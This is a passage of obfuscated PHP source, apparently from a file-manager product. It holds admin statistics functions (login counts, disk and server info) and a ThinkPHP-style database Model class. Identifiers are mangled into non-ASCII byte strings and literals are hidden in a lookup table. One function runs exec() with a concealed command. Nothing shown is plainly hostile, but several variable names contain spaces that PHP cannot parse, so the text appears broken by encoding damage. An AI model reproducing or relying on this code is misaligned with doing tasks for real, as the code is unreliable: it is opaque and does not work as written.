$ø·šõ´« - $Éáâƒğ„, $ÔÄÇÊÂ[1919] => (int) $Ö“Å•öµ, $ÔÄÇÊÂ[817] => (int) $¢âíÁ¹â, $ÔÄÇÊÂ[1920] => (int) $¿ÉÁğéƒ); } private function optionAccess() { $‰€µİùí =& $_SERVER[º·Ï‹¥³]; return array($‰€µİùí[810] => $this->typeLogCnt(), $‰€µİùí[110] => $this->typeLogCnt($‰€µİùí[110]), $‰€µİùí[509] => $this->typeLogCnt($‰€µİùí[509]), $‰€µİùí[1921] => $this->typeLogCnt($‰€µİùí[1921]), $‰€µİùí[1922] => $this->typeLogCnt($‰€µİùí[1922]), $‰€µİùí[646] => $this->typeLogCnt($‰€µİùí[12], $‰€µİùí[1897])); } private function typeLogCnt($ëóĞíÛ = '', $¬®ğøˆ = "\x69\x64") { $“ØÑ¹×Æ =& $_SERVER[º·Ï‹¥³]; $†ÊäÜ‡è = array($“ØÑ¹×Æ[110] => array($“ØÑ¹×Æ[1923], $“ØÑ¹×Æ[1924]), $“ØÑ¹×Æ[509] => array($“ØÑ¹×Æ[1925], $“ØÑ¹×Æ[1926]), $“ØÑ¹×Æ[1921] => array($“ØÑ¹×Æ[1927], $“ØÑ¹×Æ[1928], $“ØÑ¹×Æ[1929]), $“ØÑ¹×Æ[1922] => array($“ØÑ¹×Æ[1930], $“ØÑ¹×Æ[1931]), $“ØÑ¹×Æ[1932] => array($“ØÑ¹×Æ[1933], $“ØÑ¹×Æ[1934], $“ØÑ¹×Æ[1935])); $¥ô›üò = strtotime(date($“ØÑ¹×Æ[1893])); $í±ñæí = array($“ØÑ¹×Æ[222] => array($“ØÑ¹×Æ[1063], $¥ô›üò)); if ($ëóĞíÛ) { $í±ñæí[$“ØÑ¹×Æ[33]] = array($“ØÑ¹×Æ[7], $†ÊäÜ‡è[$ëóĞíÛ]); } $â­€Ò‡ê = Model($“ØÑ¹×Æ[1896])->where($í±ñæí)->count($¬®ğøˆ); return (int) $â­€Ò‡ê; } private function optionServer() { $ÁƒĞÆô =& $_SERVER[º·Ï‹¥³]; $ËØ»›Îµ = $this->diskDriver(); $¸ö·Ï°• = KodIO::defaultDriver(); $ÆÁ­¼• = array($ÁƒĞÆô[868] => $¸ö·Ï°•[$ÁƒĞÆô[459]]); $ ¢¯ = Model($ÁƒĞÆô[528])->where($ÆÁ­¼•)->sum($ÁƒĞÆô[79]); $¾ïÙúÅÃ = explode($ÁƒĞÆô[53], $_SERVER[$ÁƒĞÆô[147]]); $Üİ—·óµ = $¾ïÙúÅÃ[0]; $¿éåáâÓ = $GLOBALS[$ÁƒĞÆô[6]][$ÁƒĞÆô[21]]; $ç™³‰›Ó = $¿éåáâÓ[$ÁƒĞÆô[1025]]; if ($ç™³‰›Ó == $ÁƒĞÆô[1013]) { $Ãˆº‘ = explode($ÁƒĞÆô[1335], $¿éåáâÓ[$ÁƒĞÆô[1024]]); $ç™³‰›Ó = $Ãˆº‘[0]; } if ($ç™³‰›Ó == $ÁƒĞÆô[961] || $ç™³‰›Ó == $ÁƒĞÆô[855]) { $ó­¥¢¯ = Model()->db()->query($ÁƒĞÆô[1936]); $íŒ—›È® = $ó­¥¢¯[0] && isset($ó­¥¢¯[0][$ÁƒĞÆô[1642]]) ? $ó­¥¢¯[0][$ÁƒĞÆô[1642]] : 0; $ç™³‰›Ó = $ÁƒĞÆô[1937] . ($íŒ—›È® ? $ÁƒĞÆô[8] . $íŒ—›È® : $ÁƒĞÆô[12]); } $‘Æì§Ğñ = $GLOBALS[$ÁƒĞÆô[6]][$ÁƒĞÆô[400]][$ÁƒĞÆô[878]]; return array($ÁƒĞÆô[1938] => $ËØ»›Îµ ? $ËØ»›Îµ[$ÁƒĞÆô[1939]] : 0, $ÁƒĞÆô[1940] => $ËØ»›Îµ ? $ËØ»›Îµ[$ÁƒĞÆô[1941]] : 0, $ÁƒĞÆô[1942] => (int) $¸ö·Ï°•[$ÁƒĞÆô[1939]] * 1024 * 1024 * 1024, $ÁƒĞÆô[1943] => (int) $ ¢¯, $ÁƒĞÆô[1944] => ucfirst($Üİ—·óµ), $ÁƒĞÆô[1945] => $ÁƒĞÆô[1946] . PHP_VERSION, $ÁƒĞÆô[1947] => phpBuild64() ? 64 : 32, $ÁƒĞÆô[809] => str_replace($ÁƒĞÆô[1182], $ÁƒĞÆô[1041], $ç™³‰›Ó), $ÁƒĞÆô[400] => ucfirst($‘Æì§Ğñ), $ÁƒĞÆô[32] => $_SERVER[$ÁƒĞÆô[1948]]); } private function diskDriver() { $§–‚“•é =& $_SERVER[º·Ï‹¥³]; $î¿çÍŞÖ = $§–‚“•é[8]; $†¯íÎ®ƒ = $GLOBALS[$§–‚“•é[6]][$§–‚“•é[1352]] == $§–‚“•é[1353]; if ($†¯íÎ®ƒ) { $î¿çÍŞÖ = $§–‚“•é[1949]; if (function_exists($§–‚“•é[1950])) { exec($§–‚“•é[1951], $Ù¦Ó£ùí); $î¿çÍŞÖ = $Ù¦Ó£ùí[1] . $§–‚“•é[8]; } } if (!file_exists($î¿çÍŞÖ)) { return; } $ƒ”–¨‹– = @disk_total_space($î¿çÍŞÖ); $Ï¼¨³¢ª = $ƒ”–¨‹– - @disk_free_space($î¿çÍŞÖ); return array($§–‚“•é[1939] => $ƒ”–¨‹–, $§–‚“•é[1941] => $Ï¼¨³¢ª); } public function fileChart($í¾¶õ‘î) { $¬˜×ƒÔ½ =& $_SERVER[º·Ï‹¥³]; if (isset($í¾¶õ‘î[$¬˜×ƒÔ½[1754]])) { return Model($¬˜×ƒÔ½[876])->userFileTypeProfile($í¾¶õ‘î[$¬˜×ƒÔ½[1754]]); } if (isset($í¾¶õ‘î[$¬˜×ƒÔ½[1952]])) { return Model($¬˜×ƒÔ½[876])->groupFileTypeProfile($í¾¶õ‘î[$¬˜×ƒÔ½[1952]]); } $‡¢¡µâğ = $this->sourceSize(); $²ÁºÕ” = array($¬˜×ƒÔ½[183] => 0, $¬˜×ƒÔ½[181] => 1); $¨¨ÊÓöĞ = Model($¬˜×ƒÔ½[876])->where($²ÁºÕ”)->sum($¬˜×ƒÔ½[79]); $²ÁºÕ”[$¬˜×ƒÔ½[181]] = 2; $î”—§û³ = Model($¬˜×ƒÔ½[876])->where($²ÁºÕ”)->sum($¬˜×ƒÔ½[79]); return array($¬˜×ƒÔ½[815] => $‡¢¡µâğ[$¬˜×ƒÔ½[79]], $¬˜×ƒÔ½[1886] => $‡¢¡µâğ[$¬˜×ƒÔ½[1886]], $¬˜×ƒÔ½[1887] => (int) $¨¨ÊÓöĞ, $¬˜×ƒÔ½[1888] => (int) $î”—§û³); } private function sourceSize() { $şçÒÔœƒ =& $_SERVER[º·Ï‹¥³]; $äÏ±ÏüÏ = Model($şçÒÔœƒ[876])->where(array($şçÒÔœƒ[469] => 0))->sum($şçÒÔœƒ[79]); $ õŸôá = Model($şçÒÔœƒ[528])->sum($şçÒÔœƒ[79]); if ($ õŸôá > $äÏ±ÏüÏ) { $ õŸôá = $äÏ±ÏüÏ; } return array($şçÒÔœƒ[79] => (int) $äÏ±ÏüÏ, $şçÒÔœƒ[1886] => (int) $ õŸôá); } } goto FµØ£Àâ›; c®¹å†Æë: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\x65", "\x6f\162\144\x65\x72", "\141\154\151\x61\x73", "\x68\x61\166\x69\156\147", "\x67\x72\x6f\x75\x70", "\x6c\x6f\x63\153", "\x64\x69\163\164\x69\x6e\x63\x74", "\x61\165\x74\157", "\x66\151\x6c\164\145\162", "\166\x61\154\x69\144\x61\x74\x65", "\x72\145\163\165\154\x74", "\142\x69\156\x64", "\x74\157\153\x65\x6e"); public function __construct($“Ÿ„£Ş¤ = '', $‚ïğœ£® = '', $™´ôêÖ = '') { $Ş¤ä£İã =& $_SERVER[º·Ï‹¥³]; $this->_initialize(); if (!empty($“Ÿ„£Ş¤)) { if (strpos($“Ÿ„£Ş¤, $Ş¤ä£İã[10])) { list($this->dbName, $this->name) = explode($Ş¤ä£İã[10], $“Ÿ„£Ş¤); } else { $this->name = $“Ÿ„£Ş¤; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($‚ïğœ£®)) { $this->tablePrefix = $Ş¤ä£İã[12]; } elseif ($Ş¤ä£İã[12] != $‚ïğœ£®) { $this->tablePrefix = $‚ïğœ£®; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ş¤ä£İã[296]); } $this->db(0, empty($this->connection) ? $™´ôêÖ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¾Ø’å›ç =& $_SERVER[º·Ï‹¥³]; if (empty($this->fields)) { if (think_config($¾Ø’å›ç[297])) { $ëŞ¿§ÆË = $this->dbName ? $this->dbName : think_config($¾Ø’å›ç[298]); $øğş”®€ = think_var_cache($¾Ø’å›ç[299] . strtolower(get_path_this($ëŞ¿§ÆË) . $¾Ø’å›ç[10] . $this->name)); if ($øğş”®€) { $š³™­Ûß = think_config($¾Ø’å›ç[300]); if (empty($š³™­Ûß) || $øğş”®€[$¾Ø’å›ç[301]] == $š³™­Ûß) { $this->fields = $øğş”®€; return; } } } $this->flush(); } } public function flush() { $‘”´€² =& $_SERVER[º·Ï‹¥³]; $this->db->setModel($this->name); $ñÍ¥ÀÔì = $this->db->getFields($this->getTableName()); if (!$ñÍ¥ÀÔì) { return !1; } $this->fields = array_keys($ñÍ¥ÀÔì); $this->fields[$‘”´€²[302]] = !1; foreach ($ñÍ¥ÀÔì as $ìÑ¥ˆĞŠ => $’Ã¶Ü¥‘) { $¯ÚÚêÚ[$ìÑ¥ˆĞŠ] = $’Ã¶Ü¥‘[$‘”´€²[33]]; if ($’Ã¶Ü¥‘[$‘”´€²[39]]) { $this->fields[$‘”´€²[303]] = $ìÑ¥ˆĞŠ; if ($’Ã¶Ü¥‘[$‘”´€²[42]]) { $this->fields[$‘”´€²[302]] = !0; } } } $this->fields[$‘”´€²[304]] = $¯ÚÚêÚ; if (think_config($‘”´€²[300])) { $this->fields[$‘”´€²[301]] = think_config($‘”´€²[300]); } if (think_config($‘”´€²[297])) { $¸–ĞÒ¼ = $this->dbName ? $this->dbName : think_config($‘”´€²[298]); think_var_cache($‘”´€²[299] . strtolower(get_path_this($¸–ĞÒ¼) . $‘”´€²[10] . $this->name), $this->fields); } } public function switchModel($Òü  Æ–, $¯æÍùÊ = array()) { $­•ÌÛ¤ö =& $_SERVER[º·Ï‹¥³]; $èß½ÑÚØ = ucwords(strtolower($Òü  Æ–)) . $­•ÌÛ¤ö[305]; if (!class_exists($èß½ÑÚØ)) { think_exception($èß½ÑÚØ . think_lang($­•ÌÛ¤ö[306])); } $this->_extModel = new $èß½ÑÚØ($this->name); if (!empty($¯æÍùÊ)) { foreach ($¯æÍùÊ as $ïò¼îŠè) { $this->_extModel->setProperty($ïò¼îŠè, $this->{$ïò¼îŠè}); } } return $this->_extModel; } public function __set($’½ûˆßì, $ŞÒ¾æşŒ) { $this->data[$’½ûˆßì] = $ŞÒ¾æşŒ; } public function __get($¸¡Õ÷) { return isset($this->data[$¸¡Õ÷]) ? $this->data[$¸¡Õ÷] : null; } public function __isset($ğ·ÎŒÊ») { return isset($this->data[$ğ·ÎŒÊ»]); } public function __unset($˜Ş„×¤) { unset($this->data[$˜Ş„×¤]); } public function __call($µÖ°»¬©, $ü³º®‹Ü) { $ú›¸¹ÙÊ =& $_SERVER[º·Ï‹¥³]; if (in_array(strtolower($µÖ°»¬©), $this->methods, !0)) { $this->options[strtolower($µÖ°»¬©)] = $ü³º®‹Ü[0]; return $this; } elseif (in_array(strtolower($µÖ°»¬©), array($ú›¸¹ÙÊ[307], $ú›¸¹ÙÊ[308], $ú›¸¹ÙÊ[309], $ú›¸¹ÙÊ[310], $ú›¸¹ÙÊ[311]), !0)) { $ş‡ÊâÅ® = isset($ü³º®‹Ü[0]) ? $ü³º®‹Ü[0] : $ú›¸¹ÙÊ[211]; $ş‡ÊâÅ® = $this->db->parseKey($ş‡ÊâÅ®); return $this->getField(strtoupper($µÖ°»¬©) . $ú›¸¹ÙÊ[312] . $ş‡ÊâÅ® . $ú›¸¹ÙÊ[313] . $µÖ°»¬©, $ú›¸¹ÙÊ[307]); } elseif (strtolower(substr($µÖ°»¬©, 0, 5)) == $ú›¸¹ÙÊ[314]) { $ş‡ÊâÅ® = think_parse_name(substr($µÖ°»¬©, 5)); $ëä¿Ø›»[$ş‡ÊâÅ®] = $ü³º®‹Ü[0]; return $this->where($ëä¿Ø›»)->find(); } elseif (strtolower(substr($µÖ°»¬©, 0, 10)) == $ú›¸¹ÙÊ[315]) { $şˆ÷¬ÅÇ = think_parse_name(substr($µÖ°»¬©, 10)); $ëä¿Ø›»[$şˆ÷¬ÅÇ] = $ü³º®‹Ü[0]; return $this->where($ëä¿Ø›»)->getField($ü³º®‹Ü[1]); } elseif (isset($this->_scope[$µÖ°»¬©])) { return $this->scope($µÖ°»¬©, $ü³º®‹Ü[0]); } elseif (method_exists($this, $µÖ°»¬©)) { array_unshift($ü³º®‹Ü, $µÖ°»¬©); return call_user_func_array(array($this, $ú›¸¹ÙÊ[316]), $ü³º®‹Ü); } else { return call_user_func_array(array(parent, $µÖ°»¬©), $ü³º®‹Ü); } } protected function call() { $ŞŒ¿î =& $_SERVER[º·Ï‹¥³]; $—ûÑÑ§ = func_get_args(); $ïåš²¸ = array_shift($—ûÑÑ§); $Óõ³¬Ğà = $ïåš²¸; if (is_array($ïåš²¸)) { $Óõ³¬Ğà = $ïåš²¸[1]; $ïåš²¸ = $ïåš²¸[0]; } $”Ñì˜…¿ = count($—ûÑÑ§) - 1; if (isset($—ûÑÑ§[$”Ñì˜…¿]) && $—ûÑÑ§[$”Ñì˜…¿] === $ïåš²¸) { think_exception(__CLASS__ . $ŞŒ¿î[4] . $ïåš²¸ . think_lang($ŞŒ¿î[317])); return; } $—ûÑÑ§[] = $ïåš²¸; if (method_exists($this, $ŞŒ¿î[318])) { $Ö¿¹û†÷ = call_user_func_array(array($this, $ŞŒ¿î[319]), array($Óõ³¬Ğà, $—ûÑÑ§)); if (!is_null($Ö¿¹û†÷) && $Ö¿¹û†÷ !== !1) { return $Ö¿¹û†÷; } } $âÈ°®¥ = call_user_func_array(array($this, $ïåš²¸), $—ûÑÑ§); if (method_exists($this, $ŞŒ¿î[320])) { $Ö¿¹û†÷ = call_user_func_array(array($this, $ŞŒ¿î[321]), array($Óõ³¬Ğà, $—ûÑÑ§, $âÈ°®¥)); if ($Ö¿¹û†÷) { return $Ö¿¹û†÷; } } return $âÈ°®¥; } protected function _initialize() { } protected function _facade($Òãò¬üÜ) { $¯ÍÕÍì¯ =& $_SERVER[º·Ï‹¥³]; if (!empty($this->fields)) { foreach ($Òãò¬üÜ as $ÔÖµÜ§‚ => $–ƒ÷¶Ä) { if (is_array($this->fields) && !in_array($ÔÖµÜ§‚, $this->fields, !0)) { unset($Òãò¬üÜ[$ÔÖµÜ§‚]); } elseif (is_scalar($–ƒ÷¶Ä)) { $this->_parseType($Òãò¬üÜ, $ÔÖµÜ§‚); } } } if (!empty($this->options[$¯ÍÕÍì¯[322]])) { $Òãò¬üÜ = array_map($this->options[$¯ÍÕÍì¯[322]], $Òãò¬üÜ); unset($this->options[$¯ÍÕÍì¯[322]]); } $this->_beforeWrite($Òãò¬üÜ); return $Òãò¬üÜ; } protected function _beforeWrite(&$Ñæ¡Šı) { } public function add($Ï¿ÉÑ = '', $ÉÛ÷»Óá = array(), $Á‰ğÂüË = false) { if (empty($Ï¿ÉÑ)) { if (!empty($this->data)) { $Ï¿ÉÑ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[º·Ï‹¥³][323]); return !1; } } $ÉÛ÷»Óá = $this->_parseOptions($ÉÛ÷»Óá); $Ï¿ÉÑ = $this->_facade($Ï¿ÉÑ); if (!1 === $this->_beforeInsert($Ï¿ÉÑ, $ÉÛ÷»Óá)) { return !1; } $É›•æá« = $this->db->insert($Ï¿ÉÑ, $ÉÛ÷»Óá, $Á‰ğÂüË); if (!1 !== $É›•æá«) { $¿ÀØ‘ù = $this->getLastInsID(); if ($¿ÀØ‘ù) { $Ï¿ÉÑ[$this->getPk()] = $¿ÀØ‘ù; $this->_after_insert($Ï¿ÉÑ, $ÉÛ÷»Óá); return $¿ÀØ‘ù; } $this->_after_insert($Ï¿ÉÑ, $ÉÛ÷»Óá); } return $É›•æá«; } protected function _beforeInsert(&$–¹¥…‹…, $éÄİ«•Ñ) { } protected function _after_insert($é´ñ÷Ûú, $¼§©èó) { } public function addAll($ƒé•÷ãµ, $ò½¢Ğ¨¼ = array(), $ÂöŞ®ö× = false) { $®¢âÚ¶· =& $_SERVER[º·Ï‹¥³]; if (empty($ƒé•÷ãµ)) { $this->error = think_lang($®¢âÚ¶·[323]); return !1; } $ò½¢Ğ¨¼ = $this->_parseOptions($ò½¢Ğ¨¼); foreach ($ƒé•÷ãµ as $Ñ·À œç => $ÑÓ‚ÚÜô) { $ƒé•÷ãµ[$Ñ·À œç] = $this->_facade($ÑÓ‚ÚÜô); } if (method_exists($this->db, $®¢âÚ¶·[324])) { $ç‡¼Ÿï = $this->db->insertAll($ƒé•÷ãµ, $ò½¢Ğ¨¼, $ÂöŞ®ö×); } else { $this->startTrans(); foreach ($ƒé•÷ãµ as $Ñ·À œç => $ÑÓ‚ÚÜô) { $ç‡¼Ÿï = $this->db->insert($ÑÓ‚ÚÜô, $ò½¢Ğ¨¼, $ÂöŞ®ö×); } $this->commit(); } if (!1 !== $ç‡¼Ÿï) { $¯äÏ¸ÑÂ = $this->getLastInsID(); if ($¯äÏ¸ÑÂ) { return $¯äÏ¸ÑÂ; } } return $ç‡¼Ÿï; } public function selectAdd($•ƒ§İ = '', $©øˆ‚·” = '', $Ñ•ç–µ = array()) { $¿şĞÏÊœ =& $_SERVER[º·Ï‹¥³]; $Ñ•ç–µ = $this->_parseOptions($Ñ•ç–µ); if (!1 === ($ïé‡ñÔ = $this->db->selectInsert($•ƒ§İ ? $•ƒ§İ : $Ñ•ç–µ[$¿şĞÏÊœ[325]], $©øˆ‚·” ? $©øˆ‚·” : $this->getTableName(), $Ñ•ç–µ))) { $this->error = think_lang($¿şĞÏÊœ[326]); return !1; } else { return $ïé‡ñÔ; } } public function save($¬¾ŠÑ Ä = '', $Ûû¨’’  = array()) { $ÈÜ¦–‰æ =& $_SERVER[º·Ï‹¥³]; if (empty($¬¾ŠÑ Ä)) { if (!empty($this->data)) { $¬¾ŠÑ Ä = $this->data; $this->data = array(); } else { $this->error = think_lang($ÈÜ¦–‰æ[323]); return !1; } } $¬¾ŠÑ Ä = $this->_facade($¬¾ŠÑ Ä); $Ûû¨’’  = $this->_parseOptions($Ûû¨’’ ); $Äµ²ğ•í = $this->getPk(); if (!isset($Ûû¨’’ [$ÈÜ¦–‰æ[327]])) { if (isset($¬¾ŠÑ Ä[$Äµ²ğ•í])) { $·…Š‚ ¾[$Äµ²ğ•í] = $¬¾ŠÑ Ä[$Äµ²ğ•í]; $Ûû¨’’ [$ÈÜ¦–‰æ[327]] = $·…Š‚ ¾; unset($¬¾ŠÑ Ä[$Äµ²ğ•í]); } else { $this->error = think_lang($ÈÜ¦–‰æ[326]); return !1; } } if (is_array($Ûû¨’’ [$ÈÜ¦–‰æ[327]]) && isset($Ûû¨’’ [$ÈÜ¦–‰æ[327]][$Äµ²ğ•í])) { $ÜÇÛ»Ãü = $Ûû¨’’ [$ÈÜ¦–‰æ[327]][$Äµ²ğ•í]; } if (!1 === $this->_beforeUpdate($¬¾ŠÑ Ä, $Ûû¨’’ )) { return !1; } $ì˜‰„•¼ = $this->db->update($¬¾ŠÑ Ä, $Ûû¨’’ ); if (!1 !== $ì˜‰„•¼) { if (isset($ÜÇÛ»Ãü)) { $¬¾ŠÑ Ä[$Äµ²ğ•í] = $ÜÇÛ»Ãü; } $this->_afterUpdate($¬¾ŠÑ Ä, $Ûû¨’’ ); } return $ì˜‰„•¼; } protected function _beforeUpdate(&$„öû´ ù, $‹¼÷Ì›) { } protected function _afterUpdate($¦†—ü, $””ÖìÑ¯) { } public function delete($“‚“„Ş’ = array()) { $ôíœü¹× =& $_SERVER[º·Ï‹¥³]; if (empty($“‚“„Ş’) && empty($this->options[$ôíœü¹×[327]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $©±ˆÃ»è = $this->getPk(); if (is_numeric($“‚“„Ş’) || is_string($“‚“„Ş’)) { if (strpos($“‚“„Ş’, $ôíœü¹×[50])) { $€ã”©ğÅ[$©±ˆÃ»è] = array($ôíœü¹×[328], $“‚“„Ş’); } else { $€ã”©ğÅ[$©±ˆÃ»è] = $“‚“„Ş’; } $this->options[$ôíœü¹×[327]] = $€ã”©ğÅ; } $“‚“„Ş’ = $this->_parseOptions(); if (is_array($“‚“„Ş’[$ôíœü¹×[327]]) && isset($“‚“„Ş’[$ôíœü¹×[327]][$©±ˆÃ»è])) { $‹Û«›¤¹ = $“‚“„Ş’[$ôíœü¹×[327]][$©±ˆÃ»è]; } $éĞ¯êÀ÷ = $this->db->delete($“‚“„Ş’); if (!1 !== $éĞ¯êÀ÷) { $Ş†ÓöÂí = array(); if (isset($‹Û«›¤¹)) { $Ş†ÓöÂí[$©±ˆÃ»è] = $‹Û«›¤¹; } $this->_after_delete($Ş†ÓöÂí, $“‚“„Ş’); } return $éĞ¯êÀ÷; } protected function _after_delete($»°åµñ­, $–ÊÊ¿§Ë) { } public function select($¥Ïï¢Øã = array()) { $ñ³òèÖ€ =& $_SERVER[º·Ï‹¥³]; if (is_string($¥Ïï¢Øã) || is_numeric($¥Ïï¢Øã)) { $´©°îªÀ = $this->getPk(); if (strpos($¥Ïï¢Øã, $ñ³òèÖ€[50])) { $’œàĞ…¿[$´©°îªÀ] = array($ñ³òèÖ€[328], $¥Ïï¢Øã); } else { $’œàĞ…¿[$´©°îªÀ] = $¥Ïï¢Øã; } $this->options[$ñ³òèÖ€[327]] = $’œàĞ…¿; } elseif (!1 === $¥Ïï¢Øã) { $¥Ïï¢Øã = $this->_parseOptions(); return $ñ³òèÖ€[329] . $this->db->buildSelectSql($¥Ïï¢Øã) . $ñ³òèÖ€[330]; } $¥Ïï¢Øã = $this->_parseOptions(); $§±«¯ÃË = $this->db->select($¥Ïï¢Øã); if (!1 === $§±«¯ÃË) { return !1; } if (empty($§±«¯ÃË)) { return null; } $this->_afterSelect($§±«¯ÃË, $¥Ïï¢Øã); return $§±«¯ÃË; } protected function _afterSelect(&$âæÂúçš, $Ô—Å®¶¦) { } public function buildSql($ä¯µÉ£ = array()) { $éÀŸÌ =& $_SERVER[º·Ï‹¥³]; $ä¯µÉ£ = $this->_parseOptions($ä¯µÉ£); return $éÀŸÌ[329] . $this->db->buildSelectSql($ä¯µÉ£) . $éÀŸÌ[330]; } public function optionsValue($…è‚ñµï = null) { if (is_null($…è‚ñµï)) { return $this->options; } elseif (is_array($…è‚ñµï)) { $this->options = array_merge($this->options, $…è‚ñµï); } } protected function _parseOptions($”ì˜ò²Ù = array()) { $çƒİù‚ =& $_SERVER[º·Ï‹¥³]; if (is_array($”ì˜ò²Ù)) { $”ì˜ò²Ù = array_merge($this->options, $”ì˜ò²Ù); } $this->options = array(); if (!isset($”ì˜ò²Ù[$çƒİù‚[331]])) { $”ì˜ò²Ù[$çƒİù‚[331]] = $this->getTableName(); $è­æÇË = $this->fields; } else { $è­æÇË = $this->getDbFields(); } if (!empty($”ì˜ò²Ù[$çƒİù‚[332]])) { $”ì˜ò²Ù[$çƒİù‚[331]] .= $çƒİù‚[53] . $”ì˜ò²Ù[$çƒİù‚[332]]; } $”ì˜ò²Ù[$çƒİù‚[333]] = $this->name; if (isset($”ì˜ò²Ù[$çƒİù‚[327]]) && is_array($”ì˜ò²Ù[$çƒİù‚[327]]) && !empty($è­æÇË) && !isset($”ì˜ò²Ù[$çƒİù‚[334]]) && !isset($”ì˜ò²Ù[$çƒİù‚[331]])) { foreach ($”ì˜ò²Ù[$çƒİù‚[327]] as $°Éİè => $ßÒïêèø) { $°Éİè = trim($°Éİè); if (in_array($°Éİè, $è­æÇË, !0)) { if (is_scalar($ßÒïêèø)) { $this->_parseType($”ì˜ò²Ù[$çƒİù‚[327]], $°Éİè); } } elseif (!is_numeric($°Éİè) && $çƒİù‚[11] != substr($°Éİè, 0, 1) && !1 === strpos($°Éİè, $çƒİù‚[10]) && !1 === strpos($°Éİè, $çƒİù‚[312]) && !1 === strpos($°Éİè, $çƒİù‚[205]) && !1 === strpos($°Éİè, $çƒİù‚[335])) { unset($”ì˜ò²Ù[$çƒİù‚[327]][$°Éİè]); } } } $this->_options_filter($”ì˜ò²Ù); return $”ì˜ò²Ù; } protected function _options_filter(&$ÎëØ‹ü‘) { } protected function _parseType(&$Ì¶Ñ, $åõ×Ää‰) { $Ş˜Ñß‰Ñ =& $_SERVER[º·Ï‹¥³]; if (empty($this->options[$Ş˜Ñß‰Ñ[336]][$Ş˜Ñß‰Ñ[4] . $åõ×Ää‰])) { $…•üÆ = strtolower($this->fields[$Ş˜Ñß‰Ñ[304]][$åõ×Ää‰]); if (!1 !== strpos($…•üÆ, $Ş˜Ñß‰Ñ[337])) { } elseif (!1 === strpos($…•üÆ, $Ş˜Ñß‰Ñ[338]) && !1 !== strpos($…•üÆ, $Ş˜Ñß‰Ñ[339])) { $Ì¶Ñ[$åõ×Ää‰] = intval($Ì¶Ñ[$åõ×Ää‰]); } elseif (!1 !== strpos($…•üÆ, $Ş˜Ñß‰Ñ[340]) || !1 !== strpos($…•üÆ, $Ş˜Ñß‰Ñ[341])) { $Ì¶Ñ[$åõ×Ää‰] = floatval($Ì¶Ñ[$åõ×Ää‰]); } elseif (!1 !== strpos($…•üÆ, $Ş˜Ñß‰Ñ[342])) { $Ì¶Ñ[$åõ×Ää‰] = (bool) $Ì¶Ñ[$åõ×Ää‰]; } } } public function find($ÍÂì‡‚ = array()) { $‚÷±µëê =& $_SERVER[º·Ï‹¥³]; if (is_numeric($ÍÂì‡‚) || is_string($ÍÂì‡‚)) { $‚£âÛ›ı[$this->getPk()] = intval($ÍÂì‡‚); $this->options[$‚÷±µëê[327]] = $‚£âÛ›ı; } $this->options[$‚÷±µëê[343]] = 1; $ÍÂì‡‚ = $this->_parseOptions(); $°ºë»†„ = $this->db->select($ÍÂì‡‚); if (!1 === $°ºë»†„) { return !1; } if (empty($°ºë»†„)) { return null; } $this->data = $°ºë»†„[0]; $this->_afterFind($this->data, $ÍÂì‡‚); if (!empty($this->options[$‚÷±µëê[344]])) { return $this->returnResult($this->data, $this->options[$‚÷±µëê[344]]); } return $this->data; } protected function _afterFind(&$·€¯µ†Ñ, $ÎäŸãÎØ) { } protected function returnResult($…¶‡ú‡¡, $ªÁğ¡¶¿ = '') { $çé©µë¬ =& $_SERVER[º·Ï‹¥³]; if ($ªÁğ¡¶¿) { if (is_callable($ªÁğ¡¶¿)) { return call_user_func($ªÁğ¡¶¿, $…¶‡ú‡¡); } switch (strtolower($ªÁğ¡¶¿)) { case $çé©µë¬[345]: return json_encode($…¶‡ú‡¡); case $çé©µë¬[346]: return xml_encode($…¶‡ú‡¡); } } return $…¶‡ú‡¡; } public function parseFieldsMap($ü€¡™“, $ôµµÇ©Ø = 1) { if (!empty($this->_map)) { foreach ($this->_map as $‰âÉ‹ª´ => $°óİåÕ‡) { if ($ôµµÇ©Ø == 1) { if (isset($ü€¡™“[$°óİåÕ‡])) { $ü€¡™“[$‰âÉ‹ª´] = $ü€¡™“[$°óİåÕ‡]; unset($ü€¡™“[$°óİåÕ‡]); } } else { if (isset($ü€¡™“[$‰âÉ‹ª´])) { $ü€¡™“[$°óİåÕ‡] = $ü€¡™“[$‰âÉ‹ª´]; unset($ü€¡™“[$‰âÉ‹ª´]); } } } } return $ü€¡™“; } public function setField($›ıÀØß, $¢Äë¯„É = '') { if (is_array($›ıÀØß)) { $¢ê©¤ÅÊ = $›ıÀØß; } else { $¢ê©¤ÅÊ[$›ıÀØß] = $¢Äë¯„É; } return $this->save($¢ê©¤ÅÊ); } public function setAdd($ûİƒ÷‰¼, $œÕ«Œí  = 1) { $ë‚æğğ„ =& $_SERVER[º·Ï‹¥³]; $¸‰ü´˜û = $ûİƒ÷‰¼ . $ë‚æğğ„[347] . $œÕ«Œí ; if ($œÕ«Œí  < 0) { $¸‰ü´˜û = $ûİƒ÷‰¼ . $œÕ«Œí ; } return $this->setField($ûİƒ÷‰¼, array($ë‚æğğ„[348], $¸‰ü´˜û)); } public function getField($ÄÁ¥¥Æ, $ù×†§ô§ = null) { $Ô°¢à›¡ =& $_SERVER[º·Ï‹¥³]; $ËµÏ†„¬[$Ô°¢à›¡[325]] = $ÄÁ¥¥Æ; $ËµÏ†„¬ = $this->_parseOptions($ËµÏ†„¬); $ÄÁ¥¥Æ = trim($ÄÁ¥¥Æ); if (strpos($ÄÁ¥¥Æ, $Ô°¢à›¡[50])) { if (!isset($ËµÏ†„¬[$Ô°¢à›¡[343]])) { $ËµÏ†„¬[$Ô°¢à›¡[343]] = is_numeric($ù×†§ô§) ? $ù×†§ô§ : $Ô°¢à›¡[12]; } $ÇÀ×ïñÌ = $this->db->select($ËµÏ†„¬); if (!empty($ÇÀ×ïñÌ)) { $Šï°´€ = explode($Ô°¢à›¡[50], 